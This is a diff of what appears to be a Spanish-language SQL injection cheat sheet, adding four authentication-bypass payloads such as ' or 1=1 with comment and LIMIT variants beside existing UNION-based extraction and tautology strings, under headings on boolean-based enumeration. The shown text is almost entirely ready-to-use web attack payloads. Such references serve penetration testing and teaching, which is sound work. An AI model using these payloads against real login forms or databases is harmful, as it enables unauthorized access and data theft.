@@ -108,6 +108,18 @@ UNION SELECT 1,2,group_concat(columna1,':',columna2 SEPARATOR '<br>') FROM nombr
 ```
 ' or '1'='1'#
 ```
+```
+' or '1'=1 --+
+```
+```
+user' or 1=1;#
+```
+```
+user' or 1=1 LIMIT 1;#
+```
+```
+user' or 1=1 LIMIT 0,1;#
+```
 #### Boolean Based (poner siempre por defecto 'false')
 
 ##### Database enumeration brute force attack(sin sustituir ninguno de los numeros)
